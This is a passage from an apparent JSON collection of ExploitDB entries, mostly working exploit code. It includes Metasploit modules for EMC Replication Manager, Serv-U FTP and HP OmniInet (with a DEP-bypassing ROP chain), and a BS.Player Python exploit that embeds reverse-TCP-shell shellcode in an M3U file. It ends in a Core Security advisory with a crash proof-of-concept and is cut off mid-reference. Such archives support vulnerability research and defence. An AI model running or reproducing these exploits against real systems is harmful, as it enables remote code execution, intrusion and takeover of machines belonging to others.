</ir_message></ir_runProgramAppInfo>\"\r\n    run_prog << \"<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>\"\r\n    run_prog_header = \"EMC_Len000000\"\r\n    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog\r\n\r\n    vprint_status(\"Executing command....\")\r\n    sock.put(run_prog_packet)\r\n    sock.get_once(-1, 1)\r\n\r\n    end_string = Rex::Text.rand_text_alpha(rand(10)+32)\r\n    sock.put(end_string)\r\n    sock.get_once(-1, 1)\r\n    disconnect\r\n\r\n  end\r\nend",
                "description": "EMC Replication Manager < 5.3 - Command Execution (Metasploit)",
                "author": "Metasploit",
                "_id": 41704,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-02-27T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = NormalRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Egghunter\r\n\tinclude Msf::Exploit::Remote::Ftp\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Serv-U FTP Server <4.2 Buffer Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tThis module exploits a stack buffer overflow in the site chmod command\r\n\t\t\t\tin versions of Serv-U FTP Server prior to 4.2.\r\n\r\n\t\t\t\tYou must have valid credentials to trigger this vulnerability. Exploitation\r\n\t\t\t\talso leaves the service in a non-functional state.\r\n\t\t\t},\r\n\t\t\t'Author'         => 'thelightcosine <thelightcosine[at]metasploit.com>',\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2004-2111'],\r\n\t\t\t\t\t[ 'BID', '9483'],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => true,\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'thread',\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'    => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'Windows 2000 SP0-4 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x750212bc, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 396 } ],\r\n\t\t\t\t\t[ 'Windows XP SP0-1 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x71aa388f, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 394 } ]\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Dec 31 2004',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\tend\r\n\r\n\tdef check\r\n\t\tconnect\r\n\t\tdisconnect\r\n\r\n\t\tif (banner =~ /Serv-U FTP Server v((4.(0|1))|3.\\d)/)\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\t\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\t\tconnect_login\r\n\r\n\t\teggoptions =\r\n\t\t{\r\n\t\t\t:checksum => true,\r\n\t\t\t:eggtag => \"W00T\"\r\n\t\t}\r\n\r\n\t\thunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)\r\n\r\n\r\n\t\tbuffer = \"chmod 777 \"\r\n\t\tbuffer <<  make_nops(target['Offset'] - egg.length - hunter.length)\r\n\t\tbuffer << egg\r\n\t\tbuffer << hunter\r\n\t\tbuffer << \"\\xeb\\xc9\\x41\\x41\"\t#nseh, jump back to egghunter\r\n\t\tbuffer << [target.ret].pack('V')\t#seh\r\n\t\tbuffer << rand_text(5000)\r\n\r\n\t\tprint_status(\"Trying target #{target.name}...\")\r\n\r\n\t\tsend_cmd( ['SITE', buffer] , false)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\n\r\nend",
                "description": "RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18190,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-02T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "#\r\n#\r\n#[+]Exploit Title: Exploit Buffer Overfloe Bsplayer 2.57(UNICODE-SEH)\r\n#[+]Date: 01\\07\\2010\r\n#[+]Author: C4SS!0 G0M3S\r\n#[+]Software Link: http://www.bsplayer.com/services/downlad-free-bsplayer.php?type=2\r\n#[+]Version: 2.57\r\n#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN\r\n#[+]CVE: N/A\r\n#\r\n#\r\n#  #########      ##   #########      #########  ##     ###############\r\n#  #########    ####   #########      #########  ##     ##           ##    \r\n#  ##         ## ##    ##             ##         ##     ##           ## \r\n#  ##        ##  ##    ##             ##         ##     ##           ##\r\n#  ##       ########## ########       ########   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ########      ##    ########      #########   ##     ##           ##\r\n#  ########      ##    ########      #########   \\/     ###############\r\n#                                              \r\n#Created By C4SS!0 G0M3S\r\n#Louredo_@hotmail.com\r\n#www.invasao.com.br\r\n#\r\n#\r\n\r\n\r\nimport os\r\nimport sys\r\nimport time\r\nimport string\r\n\r\nos.system(\"cls\")\r\nos.system(\"color 4f\")\r\n\r\ndef usage():\r\n        print \"\\n\"\r\n        print \"[+]Exploit: Exploit Buffer Overflow Bsplayer(UNICODE-SEH)\"\r\n        print \"[+]Date: 01\\\\07\\\\2010\"\r\n        print \"[+]Author: C4SS!0 G0M3S\"\r\n        print \"[+]Home: www.invasao.com.br\"\r\n        print \"[+]E-mail: Louredo_@hotmail.com\"\r\n        print \"[+]Version: 2.57\"\r\n        print \"[+]Software: Bsplayer 2.57\\n\"\r\n        print \"[-]Note:\"\r\n        print \"TO EXPLOIT THE RUN FILE NAME MUST BE FILE_NAME.M3U\\n\"\r\n\r\n\r\nif((len(sys.argv)!=3) or (int(sys.argv[1])<1) or (int(sys.argv[1])>2)):\r\n        usage()\r\n        print \"Payloads:\\n1 - WinExec(\\\"Calc.exe\\\",0)\\n2 - Reverse_Tcp_Shell\\n\"\r\n        print \"[-]Usage: \"+sys.argv[0]+\" <Playload Number> <File Name>\"\r\n        print \"[-]Exemple: \"+sys.argv[0]+\" 1 Exploit.m3u\"\r\n        sys.exit(0)\r\n\r\nusage()\r\nbuffer = \"\\x42\" * 4102\r\nnseh = \"\\x61\\x6d\"\r\nseh = \"\\xde\\x4e\" #pop ebx - pop ebp - ret at 0x004E00DE [bsplayer.exe]\r\negg_hunter = \"\\x45\\x61\\x45\\x61\\x45\\x50\\x45\\xc3\"\r\n\r\njunk = \"\\x45\" * 1094\r\nprint \"[*]Identifying the length Shellcode\"\r\ntime.sleep(1)\r\nif int(sys.argv[1]) == 2:\r\n\tshellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n\t\"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBNKWY7N4PV9X6PQX1PV9JYNZ9SDMTZTR\" # \r\n\t\"83SY0KT01RPLLLCBPLLT2RLPJX9KKTOX3NZUKKV0VLK3Y3MLRONMMJU2VWC8VQKQSOPTZT3CTK1LPUR6\" #\r\n\t\"KZR65RJC7NPWDLVRZQUMFMV85BXR7BOG8SCKUNXUVMVGIPMKJJZ6XSQ40ORI2UTOWNWRXVF679XJWYPL\" #FROM METASPLOIT FRAMEWORK \r\n\t\"OU2QOXQNN0GGLNM3HJLRVWUSKO4OWMVOZKXLKLY2B3U1BQMPEBVMQEEFULKP12N8GHWH43CROTS2NPPD\" #\r\n\t\"QT0YXLS5MOM3OCKSRWPFLJWWN19PSXXOFKYD7KLN3WYMFFEJY7LO785W6C1TM7MOURUH7EOM1FZTEMOJ\" #SHELLCODE REVERSE_TCP_SHELL ON PORT 4444\r\n\t\"28TUN2LK0SKNTKKPHJSDRKLFONNC2620QXQTRFZUE3UGR8TOL5V3YO47PRSMMBURNNL9MNEHNELX5NOW\" #\r\n\t\"Q8C5UPOLK3BIRSQBOXVDD9STOI8LHBM1Y3PEPOKMQOMKRN8JZIJ3MPJ0VRRYY92VP0DLVJ3TVJFWKSKB\" #PROMPT:\r\n\t\"QCMXW7O30CRZRF7JK7JV4S2SRM9M5RRTOZZVFYQQDKKW1LY7S6LZFJLLZNXMJB685QOJGLNKNITOCZSK\" #\r\n\t\"QITVVPONFL6LN0O1RVBINM6OLML4XL0TNL6RRVN28UOKSULQJXYLLY9NLM57LVDS8NY2PMQ3MORRMHQD\" #C:\\>Telnet 127.0.0.1 4444\r\n\t\"BEINV9QY8U0MN1ZTUPPO3KGMVDOQWLNEUOJLWKE6UPNMBX12QURRNVJN78DYMXKOMHNA\")            # \r\n                                                                                       #\r\nif int(sys.argv[1]) == 1:\r\n        shellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n        \"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBIKY0NQ99GO3LLVRPHLXY2TMTL46QMNR\"\r\n        \"8P1SHN853YXKLKSSHQXL4TENPSHWL3599RX6VNCJUKCH4VNSMM25ZOJP2MLWORBZMMM1DJ5QVO9MQ9W4\"\r\n        \"V30ZUBQWZLFP5KELTXGCLKKMKLE2KZPNG9MOXKMNBNXMKVBK893KGOKSJXOPLPOMS8SR3UTPWKGHXOKT\"\r\n        \"CDN4CMOQG1C34R171NSXML5WVKE7QSN4XL5VJZQM5W8O669OMOK90J9KN0Q31VVLNNOCUN957X7SHNOP\"\r\n        \"YTP3KXWLE3O9XCKXJA\")\r\n\r\nprint \"[*]The Length Shellcode:\"+str(len(shellcode))\r\n\r\ntime.sleep(1)\r\n\r\nshellcode += \"\\x41\" * 5000\r\n\r\nfile = str(sys.argv[2])\r\n\r\npayload = buffer+nseh+seh+egg_hunter+junk+shellcode\r\n\r\nop = \"w\"\r\nprint \"[*]Creating Your File \"+file\r\ntime.sleep(1)\r\ntry:\r\n        f = open(file,op)\r\n        f.write(\"http://\"+payload)\r\n        f.close()\r\n        print \"[*]The File \"+file+\" was Successfully Created\"\r\nexcept:\r\n        print \"[*]Error Creating File \"+file",
                "description": "BS.Player 2.57 - Local Buffer Overflow (SEH Unicode)",
                "author": "C4SS!0 G0M3S",
                "_id": 15934,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-01-07T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: hp_omniinet_4.rb 13096 2011-07-04 22:33:47Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"HP OmniInet.exe Opcode 20 Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability found in HP Data Protector's OmniInet\r\n\t\t\t\tprocess.  By supplying a long string of data as the file path with opcode '20',\r\n\t\t\t\ta buffer overflow can occur when this data is being written on the stack where\r\n\t\t\t\tno proper bounds checking is done beforehand, which results arbitrary code\r\n\t\t\t\texecution under the context of SYSTEM.  This module is also made against systems\r\n\t\t\t\tsuch as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR\r\n\t\t\t\tenabled by default.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => \"$Revision: 13096 $\",\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Oren Isacson',  #Initial discovery, poc\r\n\t\t\t\t\t'muts',          #Initial poc of the ROP exploit w/ dookie\r\n\t\t\t\t\t'dookie',        #Initial poc of the ROP exploit w/ muts\r\n\t\t\t\t\t'sinn3r',        #MSF module with corelanc0d3r  (Also Thx to MC and HD)\r\n\t\t\t\t\t'corelanc0d3r',  #MSF module with sinn3r\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-1865' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.exploit-db.com/exploits/17468/' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],\r\n\t\t\t\t\t[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182' ],\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'        => \"\\x00\",\r\n\t\t\t\t\t'PrependEncoder'  => \"\\x66\\x81\\xc4\\xb8\\x0b\\x61\\x9d\", #add sp, 0xb88; popad; popfd\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => \"process\",\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t#If 'Max' gets too long (ie. 10000 bytes), we can get a busted heap\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on XP SP3 or Win Server 2003',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 2005,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on Win Server 2008',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 1993,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Jun 29 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options([Opt::RPORT(5555)], self.class)\r\n\tend\r\n\r\n\tdef nop\r\n\t\treturn make_nops(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\tconnect\r\n\r\n\t\t#mona.py tekniq\r\n\t\t#https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/\r\n\t\trop = [\r\n\t\t\t#Initial setup\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t#ROP begins here\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # Make EAX readable\r\n\t\t\t0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EBP\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # <- VirtualProtect() found in IAT\r\n\t\t\t0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0b,  # Slide, so next gadget would write to correct stack location\r\n\t\t\t0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EDI (filler)\r\n\t\t\tnop,         # will be patched at runtime (VP), then picked up into ESI\r\n\t\t\tnop,         # EBX (filler)\r\n\t\t\t0x7c376402,  # POP EBP # RETN (msvcr71.dll)\r\n\t\t\t0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0xfffff82f,  # size 20001 bytes\r\n\t\t\t0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffff,  # pop value into ebx\r\n\t\t\t0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\r\n\t\t\t0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\r\n\t\t\t0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34b8d8,  # ROP NOP (-> edi)\r\n\t\t\t0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\r\n\t\t\t0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x90909090,  # NOPS (-> eax)\r\n\t\t\t0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\r\n\t\t].pack('V*')\r\n\r\n\t\t#Overflowing path \"C:\\Program Files\\OmniBack\\bin\\\"\r\n\t\t#4807 bytes after target.ret, but we need to use less than that to avoid a busted heap\r\n\t\tsploit = ''\r\n\t\tsploit << rand_text_alpha(target['Offset']-sploit.length)\r\n\t\tsploit << [target.ret].pack('V*')\r\n\t\tsploit << rop\r\n\t\tsploit << payload.encoded\r\n\t\tsploit << rand_text_alpha(target['Max']-sploit.length)\r\n\r\n\t\tpkt  = ''\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << \"\\x41\\x41\"  #Length field place holder\r\n\t\tpkt << \"\\xff\\xfe\"\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x32\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 5)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\")\r\n\t\tpkt << Rex::Text.to_unicode(\"20\")  #Opcode\r\n\t\tpkt << \"\\x00\"\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 7)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\\x00\")\r\n\t\tpkt << sploit\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 16)\r\n\r\n\t\t#pkt length\r\n\t\tpkt[2,2] = [pkt.length-5].pack('n')\r\n\r\n\t\tprint_status(\"Sending packet to #{datastore['RHOST']}...\")\r\n\t\tsock.put(pkt)\r\n\r\n\t\t#Data Protector lags before triggering the vuln code\r\n\t\t#Long delay seems necessary to ensure we get a shell back\r\n\t\tselect(nil,nil,nil,20)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\nend",
                "description": "HP OmniInet.exe Opcode 20 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17490,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-07-04T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n  Core Security Technologies - Corelabs Advisory\r\n       http://corelabs.coresecurity.com/\r\n\r\n  HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\n\r\n\r\n1. *Advisory Information*\r\n\r\nTitle: HP Data Protector EXEC_CMD Buffer Overflow Vulnerability\r\nAdvisory ID: CORE-2011-0606\r\nAdvisory URL:\r\nhttp://www.coresecurity.com/content/HP-Data-Protector-EXECCMD-Vulnerability\r\nDate published: 2011-06-29\r\nDate of last update: 2011-06-29\r\nVendors contacted: HP\r\nRelease mode: Coordinated release\r\n\r\n\r\n2. *Vulnerability Information*\r\n\r\nClass: Remote stack overflow [CWE-120]\r\nImpact: Code execution\r\nRemotely Exploitable: Yes\r\nLocally Exploitable: No\r\nCVE Name: CVE-2011-1866\r\n\r\n\r\n3. *Vulnerability Description*\r\n\r\nHP Data Protector [1] is an automated backup and recovery software for\r\nsingle-server to enterprise environments. A vulnerability in HP Data\r\nProtector could allow a remote attacker to execute arbitrary code. The\r\nvulnerability is triggered by sending a request to port 5555 of a host\r\nrunning the \"data protector inet\" service, part of HP Data Protector.\r\n\r\n\r\n4. *Vulnerable packages*\r\n\r\n   . HP OpenView Storage Data Protector v6.20 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.11 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.10 (running on Windows).\r\n   . HP OpenView Storage Data Protector v6.00 (running on Windows).\r\n   . Previous versions may be affected, but were not tested.\r\n\r\n\r\n5. *Non-vulnerable packages*\r\n\r\n   . No fixes are available at the time of publication.\r\n\r\n\r\n6. *Vendor Information, Solutions and Workarounds*\r\n\r\nHP has issued a security bulletin with document ID c02872182 [2]\r\navailable through HP Support Center at http://www.hp.com/go/HPSC.\r\n\r\nThe latest version of HP Data Protector is vulnerable to this issue. HP\r\nhas provided the following procedure to mitigate this vulnerability:\r\n\r\n   1. Upgrade to Data Protector A.06.20 or subsequent.\r\n   2. Enable encrypted control communication services on cell server and\r\nall clients in cell.\r\n\r\n The upgrade is available for download from\r\nhttp://hp.com/go/dataprotector then under 'Product Information' click on\r\n'Trials and Demos'.\r\n\r\n\r\n7. *Credits*\r\n\r\nThis vulnerability was discovered and researched by Nahuel C. Riva from\r\nCore Security Technologies. Publication was coordinated by Carlos Sarraute.\r\n\r\n\r\n8. *Technical Description / Proof of Concept Code*\r\n\r\nThe following python script can be used to reproduce the bug.\r\n\r\n/-----\r\nimport sys\r\nimport socket\r\n\r\nfrom struct import pack\r\n\r\nip = sys.argv[1]\r\nport = int(sys.argv[2]) # default tcp port 5555\r\n\r\ntarget = (ip, port)\r\n\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.connect(target)\r\n\r\npath = 'A' * 5000\r\n\r\npacket =  pack('<L', 0x20003220)\r\npacket += pack('<L', 0x00302000)\r\npacket += '\\x20'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('<L', 0x00432000)\r\npacket += pack('<L', 0x00303220)\r\npacket += '\\x20'\r\npacket += 'omnicheck.exe'\r\npacket += pack('>H', 0x0020)\r\npacket += pack('>H', 0x0020) * 4\r\npacket += pack('<L', 0x30200030)\r\npacket += pack('>H', 0x0020)\r\npacket += path\r\npacket += pack('>H', 0x0000)\r\n\r\nplen = pack('>L', len(packet))\r\n\r\ns.send(plen + packet)\r\n\r\n- -----/\r\n By executing this script, the omniinet.exe process crashes in the\r\nfollowing EIP:\r\n\r\n/-----\r\n7C8285D3    8B0424           MOV EAX,DWORD PTR SS:[ESP]\r\n7C8285D6    8BE5             MOV ESP,EBP\r\n7C8285D8    5D               POP EBP\r\n7C8285D9    C3               RETN\r\n        \r\n- -----/\r\n This is part of a function inside the ntdll.dll library, however, if we\r\nlook the SEH chain, we can see that the SEH handler was overwritten with\r\nthe value 0x00410041 (the unicode value for \"AA\"):\r\n\r\n/-----\r\nSEH chain of thread 00000578\r\nAddress    SE handler\r\n009AFF94   omniinet.00410041\r\n00410041   A3004472\r\n        \r\n- -----/\r\n The following are the values of the CPU registers at the time of the\r\ncrash:\r\n\r\n/-----\r\nEAX C0000008\r\nECX 009AEC98\r\nEDX 7C82859C ntdll.KiRaiseUserExceptionDispatcher\r\nEBX 0015B480\r\nESP 009AEC44\r\nEBP 009AEC94\r\nESI 00155A80\r\nEDI 00000000\r\nEIP 7C8285D3 ntdll.7C8285D3\r\nC 0  ES 0023 32bit 0(FFFFFFFF)\r\nP 1  CS 001B 32bit 0(FFFFFFFF)\r\nA 0  SS 0023 32bit 0(FFFFFFFF)\r\nZ 0  DS 0023 32bit 0(FFFFFFFF)\r\nS 0  FS 003B 32bit 7FFDB000(FFF)\r\nT 0  GS 0000 NULL\r\nD 0\r\nO 0  LastErr ERROR_SUCCESS (00000000)\r\nEFL 00000206 (NO,NB,NE,A,NS,PE,GE,G)\r\nST0 empty 0.0\r\nST1 empty 0.0\r\nST2 empty 0.0\r\nST3 empty 0.0\r\nST4 empty 0.0\r\nST5 empty 0.0\r\nST6 empty 0.7610000000000000098\r\nST7 empty 1.0000000000000000000\r\n               3 2 1 0      E S P U O Z D I\r\nFST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)\r\nFCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1\r\n        \r\n- -----/\r\n The problem is in the 0041D170 function. This function does a blind\r\ncopy of the string passed in the packet as a path:\r\n\r\n/-----\r\n0041D170     /$ 55             PUSH EBP\r\n0041D171     |. 8BEC           MOV EBP,ESP\r\n0041D173     |. 51             PUSH ECX\r\n0041D174     |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D177     |. 8945 FC        MOV DWORD PTR SS:[EBP-4],EAX\r\n0041D17A     |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]\r\n0041D17D     |. 0FB711         MOVZX EDX,WORD PTR DS:[ECX]\r\n0041D180     |. 85D2           TEST EDX,EDX\r\n0041D182     |. 74 73          JE SHORT omniinet.0041D1F7\r\n[...]\r\n0041D1F7     |> 8B45 0C        /MOV EAX,DWORD PTR SS:[EBP+C]\r\n0041D1FA     |. 0FB708         |MOVZX ECX,WORD PTR DS:[EAX]\r\n0041D1FD     |. 85C9           |TEST ECX,ECX\r\n0041D1FF     |. 74 26          |JE SHORT omniinet.0041D227\r\n0041D201     |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D204     |. 8955 FC        |MOV DWORD PTR SS:[EBP-4],EDX\r\n0041D207     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D20A     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D20D     |. 66:8B11        |MOV DX,WORD PTR DS:[ECX]\r\n0041D210     |. 66:8910        |MOV WORD PTR DS:[EAX],DX // copy WORDs\r\nto the stack\r\n0041D213     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]\r\n0041D216     |. 83C0 02        |ADD EAX,2\r\n0041D219     |. 8945 08        |MOV DWORD PTR SS:[EBP+8],EAX\r\n0041D21C     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]\r\n0041D21F     |. 83C1 02        |ADD ECX,2\r\n0041D222     |. 894D 0C        |MOV DWORD PTR SS:[EBP+C],ECX\r\n0041D225     |.^EB D0          \\JMP SHORT omniinet.0041D1F7\r\n0041D227     |> 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]\r\n0041D22A     |. 66:C702 0000   MOV WORD PTR DS:[EDX],0\r\n0041D22F     |. 8B45 FC        MOV EAX,DWORD PTR SS:[EBP-4]\r\n0041D232     |. 8BE5           MOV ESP,EBP\r\n0041D234     |. 5D             POP EBP\r\n0041D235     \\. C3             RETN\r\n        \r\n- -----/\r\n\r\n\r\n\r\n9. *Report Timeline*\r\n\r\n. 2011-06-06:\r\nCore Security Technologies notifies the HP team of the vulnerabilities\r\nand provides the technical details. Publication date is temporarily set\r\nto July 5th, 2011.\r\n\r\n. 2011-06-06:\r\nVendor confirms that a new case was assigned within HP Software Security\r\nResponse Team (SSRT).\r\n\r\n. 2011-06-16:\r\nCore requests an update on this issue, in particular Core asks the\r\nvendor for a technical analysis of the bugs, a list of affected products\r\nand versions, and the vendor's plan for providing a fix (no reply\r\nreceived).\r\n\r\n. 2011-06-23:\r\nCore requests once more an update.\r\n\r\n. 2011-06-28:\r\nVendor communicates that a security bulletin will be issued on the same\r\nday (June 28). The vendor confirms the vulnerabilities, and recommends\r\nas mitigation to enable encrypted communications in the cell server and\r\nclient.\r\n\r\n. 2011-06-28:\r\nCore requests a link to the vendor's bulletin, and asks whether CVE ids\r\nhave been assigned.\r\n\r\n. 2011-06-28:\r\nVendor provides a link to the bulletin and CVE names for the\r\nvulnerabilities.\r\n\r\n. 2011-06-29:\r\nAdvisory CORE-2011-0606 is published.\r\n\r\n\r\n\r\n10. *References*\r\n\r\n[1] HP Data Protector 